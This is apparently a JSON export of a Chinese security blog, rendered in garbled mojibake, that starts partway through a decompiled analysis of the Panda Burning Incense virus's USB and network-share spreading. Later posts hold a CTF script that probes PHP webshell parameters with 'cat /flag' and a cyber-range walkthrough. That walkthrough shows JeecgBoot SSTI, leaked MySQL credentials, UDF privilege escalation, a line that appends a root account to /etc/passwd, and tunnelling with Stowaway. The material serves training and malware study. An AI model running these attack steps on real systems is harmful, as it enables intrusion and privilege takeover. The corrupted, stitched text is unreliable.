‡ï¼‰ï¼Œç„¶åå»è¿›ç¨‹æ³¨å…¥ 1234567891011121314151617181920212223242526272829303132333435363738394041424344int *__usercall sub_4060D4@&lt;eax&gt;(int a1@&lt;eax&gt;){ int *p_n296; // ebx void *hObject; // esi bool i; // al char v4; // zf unsigned int v6[10]; // [esp-Ch] [ebp-154h] BYREF int n296; // [esp+1Ch] [ebp-12Ch] BYREF _DWORD v8[66]; // [esp+40h] [ebp-108h] BYREF int savedregs; // [esp+148h] [ebp+0h] BYREF memset(&amp;v6[5], 0, 20); v8[65] = a1; sub_4040BC(); p_n296 = &amp;n296; v6[2] = (unsigned int)&amp;savedregs; v6[1] = (unsigned int)&amp;loc_406206; v6[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v6); hObject = (void *)sub_405028(); n296 = 296; for ( i = sub_405048() != 0; i; i = sub_405068() != 0 ) { sub_406028(); sub_405FA8(); sub_403EB4(260, v8); sub_406028(); sub_405FA8(); sub_404018(); if ( v4 ) { p_n296 = (int *)sub_4060B4(); CloseHandle_0(hObject); goto LABEL_7; } } CloseHandle_0(hObject); LOBYTE(p_n296) = 1;LABEL_7: __writefsdword(0, v6[0]); sub_403C68(&amp;loc_40620D); sub_403C44(); return p_n296;} 2.4 ä¼ æ’­æœºåˆ¶ ç§»åŠ¨å­˜å‚¨ä¼ æ’­: é€šè¿‡Uç›˜ã€ç§»åŠ¨ç¡¬ç›˜ç­‰è®¾å¤‡ä¼ æ’­ ç½‘ç»œå…±äº«ä¼ æ’­: è®¿é—® admin$ å…±äº« ä½¿ç”¨ NetShareEnum æšä¸¾ç½‘ç»œå…±äº« åˆ›å»º svcshare å…±äº« å±€åŸŸç½‘ä¼ æ’­: æ‰«æå±€åŸŸç½‘å†…çš„å…¶ä»–è®¡ç®—æœº sub_40B768å‡½æ•°â€“è´Ÿè´£ç½‘ç»œä¼ æ’­ 1234567891011121314151617FARPROC sub_40B768(){ HMODULE hModule; FARPROC result; // 1. åŠ è½½ netapi32.dllï¼ˆWindows ç½‘ç»œç®¡ç† API åº“ï¼‰ hModule = LoadLibraryA(&quot;netapi32.dll&quot;); // 2. è·å–ä¸‰ä¸ªå…³é”®å‡½æ•°çš„åœ°å€ï¼š NetShareEnum = (DWORD (__stdcall *)(...)) GetProcAddress(hModule, &quot;NetShareEnum&quot;); NetApiBufferFree = (DWORD (__stdcall *)(LPVOID)) GetProcAddress(hModule, &quot;NetApiBufferFree&quot;); result = GetProcAddress(hModule, &quot;NetShareEnum&quot;); // 3. ä¿å­˜å‡½æ•°åœ°å€åˆ°å…¨å±€å˜é‡ dword_40E79C = (int)result; return result;} åŠ è½½ç½‘ç»œAPIåº“ ï¼Œä¸ºåç»­çš„ç½‘ç»œå…±äº«æšä¸¾å‡†å¤‡ã€‚å®ƒåŠ¨æ€åŠ è½½ netapi32.dll å¹¶è·å– NetShareEnum å’Œ NetApiBufferFree å‡½æ•°åœ°å€ï¼Œè¿™äº›å‡½æ•°ç”¨äºæšä¸¾ç½‘ç»œå…±äº«èµ„æºã€‚ç—…æ¯’åç»­ä¼šåˆ©ç”¨è¿™äº›å‡½æ•°æ¥å¯»æ‰¾å±€åŸŸç½‘å†…çš„å…¶ä»–è®¡ç®—æœºï¼Œå®ç°ç½‘ç»œä¼ æ’­ã€‚ é€šè¿‡ LoadLibraryA åŠ è½½ netapi32.dll åŠ¨æ€åº“ ä½¿ç”¨ GetProcAddress è·å– NetShareEnum å’Œ NetApiBufferFree å‡½æ•°åœ°å€ åˆ©ç”¨ NetShareEnum æšä¸¾ç½‘ç»œä¸­çš„å…±äº«èµ„æº é€šè¿‡å¼±å¯†ç æ”»å‡»è·å–è®¿é—®æƒé™ï¼Œç„¶åå¤åˆ¶ç—…æ¯’æ–‡ä»¶ TimerFuncå‡½æ•°ï¼šè´Ÿè´£ç§»åŠ¨å­˜å‚¨è®¾å¤‡ä¼ æ’­ å¤§è‡´æµç¨‹å¦‚ä¸‹ 123456789sub_403F18(&quot;:\\\\setup.exe&quot;, v17); // è®¾ç½®setup.exeè·¯å¾„sub_403F18(&quot;:\\\\autorun.inf&quot;, v16); // è®¾ç½®autorun.infè·¯å¾„// åˆ›å»ºautorun.infæ–‡ä»¶å¹¶å†™å…¥è‡ªåŠ¨è¿è¡Œé…ç½®sub_402AD8();*off_40D2BC = 2; // æ–‡ä»¶å†™å…¥æ¨¡å¼sub_402874(); // å¯èƒ½æ˜¯å†™å…¥[AutoRun]éƒ¨åˆ†sub_402614(); // å†™å…¥å‘½ä»¤sub_404260(); // å¯èƒ½å†™å…¥OPEN=setup.exe è°ƒç”¨ sub_403F18 åˆ›å»º setup.exe å’Œ autorun.inf æ–‡ä»¶ ä½¿ç”¨ SetFileAttributesA è®¾ç½®æ–‡ä»¶å±æ€§ï¼ˆéšè—ã€ç³»ç»Ÿï¼‰ åˆ©ç”¨ CopyFileA å¤åˆ¶ç—…æ¯’æ–‡ä»¶åˆ°ç§»åŠ¨å­˜å‚¨è®¾å¤‡ é€šè¿‡ autorun.inf é…ç½®è‡ªåŠ¨è¿è¡Œé¡¹ï¼Œå®ç°è®¾å¤‡æ’å…¥è‡ªåŠ¨æ‰§è¡Œ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145void __stdcall TimerFunc(){ int v0; // ebx char v1; // zf const CHAR *lpFileName; // esi const CHAR *lpExistingFileName; // eax const CHAR *lpExistingFileName_1; // eax const CHAR *lpFileName_1; // esi HANDLE hObject; // eax const CHAR *lpFileName_2; // eax HANDLE hObject_1; // eax const CHAR *lpFileName_3; // eax const CHAR *lpFileName_4; // eax const CHAR *lpNewFileName; // [esp-20h] [ebp-248h] const CHAR *lpNewFileName_1; // [esp-20h] [ebp-248h] unsigned int v13[3]; // [esp-18h] [ebp-240h] BYREF unsigned int v14[2]; // [esp-Ch] [ebp-234h] BYREF int *v15; // [esp-4h] [ebp-22Ch] int v16; // [esp+24h] [ebp-204h] int v17; // [esp+28h] [ebp-200h] int v18; // [esp+34h] [ebp-1F4h] int v19; // [esp+40h] [ebp-1E8h] int v20; // [esp+224h] [ebp-4h] int savedregs; // [esp+228h] [ebp+0h] BYREF v15 = &amp;savedregs; v14[1] = (unsigned int)&amp;loc_40C016; v14[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v14); v13[2] = (unsigned int)&amp;savedregs; v13[1] = (unsigned int)&amp;loc_40BFE1; v13[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v13); sub_403C44(); sub_403C44(); sub_403C44(); sub_40B9D8(); if ( v20 ) { v0 = sub_403ECC(); if ( v0 &gt;= 1 ) { do { sub_403E2C(); ((void (*)(void))sub_40B9A4)(); sub_40B9A4(v19); if ( !sub_4041B4() ) { sub_403E2C(); sub_40B9A4(v13[0]); sub_40B9A4(v18); if ( !sub_4041B4() ) { sub_403E2C(); sub_403F18(&quot;:\\\\setup.exe&quot;, v17); sub_403E2C(); sub_403F18(&quot;:\\\\autorun.inf&quot;, v16); if ( (unsigned __int8)sub_40B994() ) { sub_40277C(); sub_40BA84(); sub_40BA84(); sub_404018(); if ( !v1 ) { lpFileName = (const CHAR *)sub_4040CC(); SetFileAttributesA(lpFileName, 0x80u); if ( !DeleteFileA(lpFileName) ) break; sub_403E2C(); sub_403ED4(); lpNewFileName = (const CHAR *)sub_4040CC(); sub_40277C(); lpExistingFileName = (const CHAR *)sub_4040CC(); if ( !CopyFileA(lpExistingFileName, lpNewFileName, 0) ) break; } } else { sub_403E2C(); sub_403ED4(); lpNewFileName_1 = (const CHAR *)sub_4040CC(); sub_40277C(); lpExistingFileName_1 = (const CHAR *)sub_4040CC(); if ( !CopyFileA(lpExistingFileName_1, lpNewFileName_1, 0) ) break; } if ( (unsigned __int8)sub_40B994() ) { sub_40BA84(); sub_404018(); if ( !v1 ) { lpFileName_1 = (const CHAR *)sub_4040CC(); SetFileAttributesA(lpFileName_1, 0x80u); if ( !DeleteFileA(lpFileName_1) ) break; hObject = CreateFileA_0(lpFileName_1, 0x40000000u, 0, 0, 2u, 0, 0); CloseHandle_0(hObject); sub_402AD8(); *off_40D2BC = 2; sub_402874(); sub_402614(); sub_404260(); sub_402B88(); sub_402614(); sub_402C48(); sub_402614(); } } else { lpFileName_2 = (const CHAR *)sub_4040CC(); hObject_1 = CreateFileA_0(lpFileName_2, 0x40000000u, 0, 0, 2u, 0, 0); CloseHandle_0(hObject_1); sub_402AD8(); *off_40D2BC = 2; sub_402874(); sub_402614(); sub_404260(); sub_402B88(); sub_402614(); sub_402C48(); sub_402614(); } sub_403E2C(); sub_403ED4(); lpFileName_3 = (const CHAR *)sub_4040CC(); SetFileAttributesA(lpFileName_3, 7u); lpFileName_4 = (const CHAR *)sub_4040CC(); SetFileAttributesA(lpFileName_4, 7u); } } --v0; } while ( v0 ); } } __writefsdword(0, v13[0]); __writefsdword(0, v14[0]); sub_403C68(&amp;loc_40C01D); sub_403C68(v15);} åƒä»€ä¹ˆuç›˜ï¼Œæ‰‹æœºï¼Œä¸€æ’åˆ°ç”µè„‘å°±ä¼šç»§ç»­ä¼ æ’­ è¿™ä¸ªæˆ–è®¸å°±æ˜¯å½“å¹´ä¸ºä»€ä¹ˆä¼ æ’­èŒƒå›´è¿™ä¹ˆå¹¿çš„åŸå› (â—‹Â´ï½¥Ğ´ï½¥)ï¾‰ 2.5 æ–‡ä»¶æ„ŸæŸ“æµç¨‹ åˆ›å»º .bat æ‰¹å¤„ç†æ–‡ä»¶è¿›è¡Œè‡ªæˆ‘å¤åˆ¶å’Œæ¸…ç† æ„ŸæŸ“å¯æ‰§è¡Œæ–‡ä»¶å’Œç³»ç»Ÿæ–‡ä»¶ åˆ›å»ºå¤§é‡éšè—æ–‡ä»¶ éå†ç£ç›˜æ–‡ä»¶ï¼Œè¯†åˆ«å¯æ‰§è¡Œæ–‡ä»¶ åˆ›å»ºæˆ–ä¿®æ”¹ Desktop_.ini æ–‡ä»¶ï¼ˆç—…æ¯’çš„æ ‡è®°æ–‡ä»¶ï¼‰ é€šè¿‡ SetFileAttributesA è®¾ç½®æ–‡ä»¶å±æ€§ï¼Œé€šå¸¸ä¸ºéšè—å’Œç³»ç»Ÿå±æ€§ ä½¿ç”¨ GetLocalTime è·å–ç³»ç»Ÿæ—¶é—´ï¼Œå¯èƒ½ç”¨äºæ„ŸæŸ“æ—¶é—´æ ‡è®° æ‰§è¡Œæ–‡ä»¶æ„ŸæŸ“æ“ä½œï¼Œé€šå¸¸æ˜¯å°†ç—…æ¯’ä»£ç é™„åŠ åˆ°æ­£å¸¸æ–‡ä»¶ä¸­ å®ç°å¼‚å¸¸å¤„ç†æœºåˆ¶é¿å…æ„ŸæŸ“è¿‡ç¨‹ä¸­å‡ºé”™å¯¼è‡´ç—…æ¯’è¢«å‘ç° 3. å±å®³åˆ†æ æ–‡ä»¶æŸå: æ„ŸæŸ“å¹¶æŸåå¤§é‡å¯æ‰§è¡Œæ–‡ä»¶ ç³»ç»Ÿç ´å: ä¿®æ”¹ç³»ç»Ÿæ–‡ä»¶å’Œæ³¨å†Œè¡¨ï¼Œå¯¼è‡´ç³»ç»Ÿä¸ç¨³å®š æ•°æ®ä¸¢å¤±: å¯èƒ½åˆ é™¤æˆ–æŸåé‡è¦æ•°æ®æ–‡ä»¶ ç½‘ç»œç˜«ç—ª: åœ¨å±€åŸŸç½‘å†…å¿«é€Ÿä¼ æ’­ï¼Œæ¶ˆè€—ç½‘ç»œèµ„æº å®‰å…¨éšæ‚£: å…³é—­å®‰å…¨è½¯ä»¶ï¼Œä½¿ç³»ç»Ÿæš´éœ²åœ¨å…¶ä»–æ¶æ„è½¯ä»¶æ”»å‡»ä¸‹ åé—¨åŠŸèƒ½: å¯èƒ½ç•™æœ‰è¿œç¨‹æ§åˆ¶åé—¨ï¼Œå¯¼è‡´ç³»ç»Ÿè¢«å®Œå…¨æ§åˆ¶ 4. ç—…æ¯’æ¥æºæ ¹æ®ä»£ç ç‰¹å¾å’Œå†å²ä¿¡æ¯ï¼š 1.è¯¥ç—…æ¯’æ˜¯â€ç†ŠçŒ«çƒ§é¦™â€ç—…æ¯’çš„2.0ç‰ˆæœ¬ï¼Œæœ€åˆç”±ä¸­å›½â€whboyâ€ï¼ˆæä¿Šï¼‰ç¼–å†™ 2.æ˜¯2006-2007å¹´é—´åœ¨ä¸­å›½å¹¿æ³›ä¼ æ’­çš„çŸ¥åç—…æ¯’å˜ç§ 3.ä¸»è¦é’ˆå¯¹Windows XPç­‰æ—©æœŸWindowsæ“ä½œç³»ç»Ÿï¼Œç°åœ¨win11ï¼Œ10éƒ½é‡‡ç”¨Windows NTå†…æ ¸ 5. è§£å†³æ–¹æ¡ˆ5.1 ç´§æ€¥å¤„ç† æ–­ç½‘éš”ç¦»: ç«‹å³æ–­å¼€è¢«æ„ŸæŸ“è®¡ç®—æœºçš„ç½‘ç»œè¿æ¥ ç»ˆæ­¢æ¶æ„è¿›ç¨‹: ç»“æŸ spoclsv.exe ç­‰å¯ç–‘è¿›ç¨‹ ç¦ç”¨è‡ªå¯åŠ¨é¡¹: åˆ é™¤æ³¨å†Œè¡¨ä¸­çš„è‡ªå¯åŠ¨é¡¹å’Œå¯åŠ¨ç›®å½•ä¸­çš„æ¶æ„ç¨‹åº 5.2 æ¸…é™¤æ­¥éª¤ åˆ é™¤æ¶æ„æ–‡ä»¶: åˆ é™¤ %WINDIR%\\drivers\\spoclsv.exe åˆ é™¤æ‰€æœ‰ Desktop_.ini æ–‡ä»¶ åˆ é™¤æ‰€æœ‰ autorun.inf æ–‡ä»¶ åˆ é™¤å¯åŠ¨ç›®å½•ä¸­çš„æ¶æ„ç¨‹åº æ¸…ç†æ³¨å†Œè¡¨: åˆ é™¤ HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run ä¸­çš„å¯ç–‘é¡¹ æ¢å¤ HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL\\CheckedValue çš„å€¼ä¸º1 ä½¿ç”¨æ€æ¯’å·¥å…·: ä½¿ç”¨æ€æ¯’è½¯ä»¶è¿›è¡Œå…¨é¢æ‰«æ æ¨èä½¿ç”¨ä¸“æ€å·¥å…·è¿›è¡Œæ¸…ç† 5.3 æ¢å¤ä¸é¢„é˜² ç³»ç»Ÿæ¢å¤: ä»å¹²å‡€çš„å¤‡ä»½æ¢å¤ç³»ç»Ÿæˆ–é‡è£…ç³»ç»Ÿ æ›´æ–°è¡¥ä¸: å®‰è£…æ‰€æœ‰ç³»ç»Ÿå®‰å…¨è¡¥ä¸ åŠ å¼ºé˜²æŠ¤: å®‰è£…å¹¶æ›´æ–°æ€æ¯’è½¯ä»¶ ç¦ç”¨è‡ªåŠ¨è¿è¡ŒåŠŸèƒ½ å…³é—­ä¸å¿…è¦çš„ç½‘ç»œå…±äº« å¯¹Uç›˜ç­‰ç§»åŠ¨å­˜å‚¨è®¾å¤‡è¿›è¡Œæ‰«æåå†ä½¿ç”¨ å®šæœŸå¤‡ä»½é‡è¦æ•°æ® 6. æ€»ç»“ç†ŠçŒ«çƒ§é¦™2.0æ˜¯ä¸€ç§å…·æœ‰å¼ºç ´åæ€§å’Œä¼ æŸ“æ€§çš„è®¡ç®—æœºç—…æ¯’ï¼Œé€šè¿‡å¤šç§æ–¹å¼å®ç°è‡ªå¯åŠ¨å’Œä¼ æ’­ã€‚æ„ŸæŸ“åä¼šå¯¼è‡´ç³»ç»Ÿå¼‚å¸¸ã€æ•°æ®æŸåå’Œå®‰å…¨éšæ‚£ã€‚åŠæ—¶çš„éš”ç¦»ã€æ¸…é™¤å’Œé¢„é˜²æªæ–½æ˜¯åº”å¯¹æ­¤ç±»ç—…æ¯’çš„å…³é”®ã€‚","link":"/2025/12/11/%E4%BC%A0%E7%BB%9F%E7%97%85%E6%AF%92%E5%8F%8D%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF/"},{"title":"","text":"ä¿¡å‘¼OAæ–‡ä»¶ä¸Šä¼ ","link":"/2025/12/11/%E4%BF%A1%E5%91%BCOA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"title":"","text":"å¼ºç½‘æ¯2019â€“é«˜æ˜çš„é»‘å®¢ æ‹¿åˆ°å¾ˆå¤šå¥‡æ€ªçš„ä¸œè¥¿ï¼Œè·‘è„šæœ¬ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import requestsimport osimport reurl = 'http://7f163133-d226-4d67-bffa-9c2366d4eab3.node5.buuoj.cn:81/'path = r'C:\\Users\\11759\\Downloads\\Compressed\\sss'ptn_get = re.compile(br&quot;\\$_GET\\['(\\w+)'\\]&quot;) #åŒ¹é…æ–‡ä»¶é‡Œé¢çš„GETå†…å®¹flag_ptn = re.compile(br&quot;\\{.*?\\}&quot;)print(&quot;========== å¼€å§‹æ‰«æ ==========\\n&quot;)for f in os.scandir(path): if not f.is_file() or not f.name.endswith(&quot;.php&quot;): continue print(f&quot;[+] æ‰«ææ–‡ä»¶ï¼š{f.name}&quot;) with open(f.path, &quot;rb&quot;) as fp: content = fp.read() params = set(ptn_get.findall(content)) if not params: continue for p in params: p = p.decode() print(f&quot; [+] æµ‹è¯•å‚æ•°ï¼š{p}&quot;) try: r = requests.get( url + f.name, params={p: &quot;cat /flag&quot;}, timeout=8 ) except: continue if flag_ptn.search(r.content): print(&quot;\\næ¼æ´å‘ç°ï¼&quot;) print(f&quot;æ–‡ä»¶ï¼š{f.name}&quot;) print(f&quot;å‚æ•°ï¼š{p}&quot;) print(f&quot;PoCï¼š{url}{f.name}?{p}=cat /flag&quot;) print(&quot;\\nflag:&quot;) print(r.text) exit()print(&quot;\\n========== æ‰«æç»“æŸï¼šæœªå‘ç°å‘½ä»¤æ‰§è¡Œ ==========&quot;)ç›´æ¥è·å–payloadå¦‚ä¸‹/xk0SzyKwfzw.php?Efa5BVG=cat /flag","link":"/2025/12/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019--%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/"},{"title":"","text":"çˆ¶å­åŸŸæ­å»º çˆ¶åŸŸï¼šsky0.com dcä¸»åŸŸæ§ï¼š192.168.64.11 pcæˆå‘˜åŸŸæ§ï¼š192.168.64.12 12345678910å­åŸŸï¼šhr.sky0.com dc:å­åŸŸæ§ 192.168.64.22 pcï¼šæˆå‘˜ä¸»æœº 192.168.139.23å­åŸŸï¼špc.sky0.com dc:å­åŸŸæ§ 192.168.64.33 pcï¼šæˆå‘˜ä¸»æœº 192.168.64.34 åŸŸæ—ï¼šga.sky0.com dc å­™å­åŸŸæ§ 192.168.64.36 pc æˆå‘˜ä¸»æœº 192.168.64.36 çˆ¶åŸŸï¼šsky.com dc å­åŸŸæ§ 192.168.64.44 pc æˆå‘˜ä¸»æœº 192.168.64.45","link":"/2025/12/11/%E7%88%B6%E5%AD%90%E5%9F%9F%E6%90%AD%E5%BB%BA/"},{"title":"","text":"æ˜¥ç§‹äº‘é•œFinanceâ€“å¤–ç½‘æ‰“é¶ ä¿¡æ¯æ”¶é›†12fscan -h 39.101.71.180nmap 8.145.35.203 -p 22,80,3306,8081 -sCV å‘ç°22,80,3306,8081éƒ½æ˜¯å¼€ç€çš„å¾—åˆ°8081æœ‰JeecgBoot JeecgBoot web8081è¿™é‡Œç›´æ¥ç”¨å·¥å…·æ‰«ä¸€ä¸‹æ‰«åˆ°ssti åˆ©ç”¨JeecgBoot jmreport/loadTableData SSTIæ¨¡æ¿æ³¨å…¥æ¼æ´ æ‰§è¡Œå‘½ä»¤ï¼Œä½†è¿™ä¸ªå‘½ä»¤æ‰§è¡Œå—é™ï¼Œæˆ‘åªè¦ç”¨ä¸€äº›ç‰¹æ®Šç¬¦å·å°±æŠ¥é”™ï¼Œè€Œä¸”å‘½ä»¤è¿”å›é•¿åº¦æœ‰é™ é€šè¿‡PWDå‘½ä»¤è·å–åˆ°å½“å‰ç½‘ç«™å·¥ä½œç›®å½•ï¼Œæ‰«æçš„æ—¶å€™å‘ç°å­˜åœ¨mysql,å¤§æ¦‚ç‡ç½‘ç«™é…ç½®æ–‡ä»¶ä¸­å­˜åœ¨Mysqlè¿æ¥çš„ç›¸å…³é…ç½®ä¿¡æ¯ï¼Œç¿»æ‰¾ç›®å½•å¹¶æ²¡æœ‰æ‰¾åˆ°æœ‰ç”¨çš„é…ç½®æ–‡ä»¶ã€‚ åœ¨å·¥ä½œç›®å½•ä¸‹å¯ä»¥å‘ç°æœ‰ä¸€ä¸ªjaråŒ…ï¼Œè¿™ä¸ªç½‘ç«™å¤§æ¦‚ç‡æ˜¯ç”¨è¿™ä¸ªjaråŒ…è¿è¡Œçš„ï¼Œ ç›´æ¥ç”¨cpå‘½ä»¤æŠŠè¿™ä¸ªjaråŒ…æ”¾åˆ°80ç«¯å£ç½‘ç«™ç›®å½• /var/www/html ä¸‹ï¼Œç„¶åè®¿é—®è·¯å¾„å³å¯ä¸‹è½½è¿™ä¸ªjaråŒ… æ˜¾ç¤ºå¤±è´¥ä½†æ˜¯æ˜¯æˆåŠŸæ‰§è¡Œäº†çš„ ä¸‹è½½å¥½åï¼Œç›´æ¥è§£å‹è¿™ä¸ªjaråŒ…ï¼Œå…¨å±€æœç´¢3306é©¬ä¸Šå°±èƒ½æ‰¾åˆ°mysqlçš„é…ç½®ä¿¡æ¯ mysqlåˆ©ç”¨username: rootpassword: oZOgpwlvgh2N01eSç„¶ååˆ©ç”¨mdut è¿æ¥æ•°æ®åº“GitHub - DeEpinGh0st/MDUT-Extend-Release: MDUT-Extend(æ‰©å±•ç‰ˆæœ¬) è¿™é‡Œç”¨Udfææƒå¼€å¯å‘½ä»¤æ‰§è¡Œï¼Œç„¶åå†™ä¸€ä¸ªç‰¹æƒè´¦æˆ·åˆ° /etc/passwd 123456â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/ChunQiu/Finance]â””â”€# openssl passwd -6 123123 #ç”Ÿæˆå¯†ç hash$6$QrMcMXsfxBnF/K4m$xWsqsAYqpZEX649U/O5RqIzCUkjknjFzuvBksmKNz8r4L13zgWVW/Y3bs7jteMvSgAF7dVDtsPhfizTDKyPmD0#å†™åˆ°/etc/passwd ï¼ˆè¿™é‡Œå“ˆå¸Œå¯†ç æœ‰å¾ˆå¤šç‰¹æ®Šç¬¦å·ç”¨base64ç¼–ç åå†™å…¥ï¼‰echo YzF0cnVzOiQ2JGlqL1o4Y3FxYXdPQTJzR2skYW1EVzVWZnhJMklsUURUem1lRG9XYTFKZlRJYjBsTm8yVGFMc3E3c3JsTWNEWFFiV1k3dUNJaE1zZWE0SE8uN2dQSDFxcVUyQkI3THZlN2p6Ny5WWTA6MDowOnJvb3Q6L2hvbWUvYzF0cnVzOi9iaW4vYmFzaA== |base64 -d&gt;&gt; /etc/passwd ç”Ÿæˆhashçš„æ—¶å€™è¿™é‡Œå»ä½ çš„kaliä¸Šæ‰§è¡Œï¼Œå»å®ƒé‚£ä¸ªæœåŠ¡å™¨è·‘ä¸äº† PS: æˆ‘æ„Ÿè§‰å†™ /etc/passwd è¿™ä¸€æ­¥å¯èƒ½ä¹Ÿå¯ä»¥åœ¨Jeecgbootçš„åˆ©ç”¨å·¥å…·ä¸­å®Œæˆï¼Œä½†æ˜¯æˆ‘æ²¡æˆåŠŸè¿‡xshellé“¾æ¥æ‹¿åˆ°ç¬¬ä¸€ä¸ªflag å†…ç½‘ä»£ç†(ç¬¬ä¸€å±‚)è¿›æ¥åå…ˆçœ‹ä¸‹ç½‘ç»œè¿æ¥ï¼Œå¯ä»¥å‘ç°æœ‰ä¸ªredisçš„dockerï¼Œä½†é‡Œé¢æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œæ­¤å¤–mysqlæ•°æ®åº“é‡Œé¢ä¹Ÿæ˜¯æ²¡æœ‰ä»€ä¹ˆä¸œè¥¿çš„ç„¶åçœ‹ä¸€ä¸‹ç½‘å¡ä¿¡æ¯,çœ‹çœ‹å†…ç½‘ç½‘æ®µ 1234567891011121314151617181920212223242526272829303132333435root@web01:/# ifconfigdocker0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255 inet6 fe80::42:e2ff:fe68:591a prefixlen 64 scopeid 0x20&lt;link&gt; ether 02:42:e2:68:59:1a txqueuelen 0 (Ethernet) RX packets 797 bytes 36609 (36.6 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 805 bytes 48471 (48.4 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet 172.22.10.22 netmask 255.255.255.0 broadcast 172.22.10.255 inet6 fe80::216:3eff:fe06:4124 prefixlen 64 scopeid 0x20&lt;link&gt; ether 00:16:3e:06:41:24 txqueuelen 1000 (Ethernet) RX packets 91570 bytes 9390063 (9.3 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 95309 bytes 218743007 (218.7 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1000 (Local Loopback) RX packets 27655 bytes 8040046 (8.0 MB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 27655 bytes 8040046 (8.0 MB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0veth0eeff78: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet6 fe80::60fc:52ff:fea9:61d7 prefixlen 64 scopeid 0x20&lt;link&gt; ether 62:fc:52:a9:61:d7 txqueuelen 0 (Ethernet) RX packets 797 bytes 47767 (47.7 KB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 820 bytes 49617 (49.6 KB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ph4ntonn/Stowawayï¼šğŸ‘»Stowaway â€”â€”æ¸—é€æµ‹è¯•è€…çš„å¤šè·³ä»£ç†å·¥å…· 1netstat -lntp 123456789#ï¼ˆé¶æœºweb01æ‰§è¡Œï¼‰root@web01:/# chmod +x linux_x64_agent root@web01:/# ./linux_x64_agent -l 222025/11/15 02:25:19 [*] Starting agent node passively.Now listening on port 22 #(ä½ çš„VPSæ‰§è¡Œ)# ./linux_x64_admin -c $é¶æœºIP:22 (admin) &gt;&gt; use 0(node 0) &gt;&gt; socks 9999 è¿™æ ·å°±è¡Œæ­å¥½ä»£ç†äº†ï¼Œå¯ä»¥é€šè¿‡ vpsIP:9999 ä½œä¸ºè·³æ¿è®¿é—®åˆ°å†…ç½‘10ç½‘æ®µ åœ¨kaliä¸Šé…ç½® /etc/proxychains4.conf é€šè¿‡proxychainsæ¥ä½¿ç”¨ä»£ç† windowsä¸Šä½¿ç”¨proxyfieré…ç½®æ¥ä½¿ç”¨ä»£ç† (åœ°å€ä¸ºä½ çš„vps IP) å†…ç½‘æ‰«æä¸Šä¼ Fscanåˆ°web01å¯¹å†…ç½‘10ç½‘æ®µè¿›è¡Œæ‰«æ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152root@web01:/root# ./FScan_2.0.1_linux_x64 -h 172.22.10.22/24â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ ___ _ â”‚â”‚ / _ \\ ___ ___ _ __ __ _ ___| | __ â”‚â”‚ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / â”‚â”‚ / /_\\\\_____\\__ \\ (__| | | (_| | (__| &lt; â”‚â”‚ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ Fscan Version: 2.0.1[1.8s] å·²é€‰æ‹©æœåŠ¡æ‰«ææ¨¡å¼[1.8s] å¼€å§‹ä¿¡æ¯æ‰«æ[1.8s] CIDRèŒƒå›´: 172.22.10.0-172.22.10.255[1.8s] generate_ip_range_full[1.8s] è§£æCIDR 172.22.10.22/24 -&gt; IPèŒƒå›´ 172.22.10.0-172.22.10.255[1.9s] æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 256[1.9s] å¼€å§‹ä¸»æœºæ‰«æ[1.9s] ä½¿ç”¨æœåŠ¡æ’ä»¶: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle[1.9s] [*] ç›®æ ‡ 172.22.10.22 å­˜æ´» (ICMP)[1.9s] [*] ç›®æ ‡ 172.22.10.17 å­˜æ´» (ICMP)[1.9s] [*] ç›®æ ‡ 172.22.10.253 å­˜æ´» (ICMP)[1.9s] 